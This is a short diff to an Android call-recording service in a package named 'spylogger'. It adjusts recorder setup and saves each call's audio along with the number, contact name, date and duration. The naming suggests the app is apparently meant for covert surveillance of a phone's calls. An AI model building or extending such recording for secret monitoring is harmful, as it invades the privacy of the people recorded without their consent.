@@ -52,7 +52,8 @@ public class RecordService extends Service{
 
 			if(mediaRecorderHelper==null){
 				try {
-					mediaRecorderHelper=new MediaRecorderHelper(getApplicationContext(),true,0);
+					mediaRecorderHelper=new MediaRecorderHelper(getApplicationContext(),0,false);
+					mediaRecorderHelper.setLigacao(true);
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
@@ -105,7 +106,7 @@ public class RecordService extends Service{
 						Gravacao gravacao=new Gravacao();
 						gravacao.setRemetente(remetente);
 						gravacao.setData(new Date());
-						gravacao.setAudio(Utils.getBytes(mediaRecorderHelper.getRecordFile()));
+						gravacao.setAudio(Utils.getBytes(mediaRecorderHelper.getRecordedFile()));
 						gravacao.setNumero(phoneNumber);
 						gravacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,getApplicationContext().getContentResolver()));
 						gravacao.setDuracao(mediaRecorderHelper.getDuration());
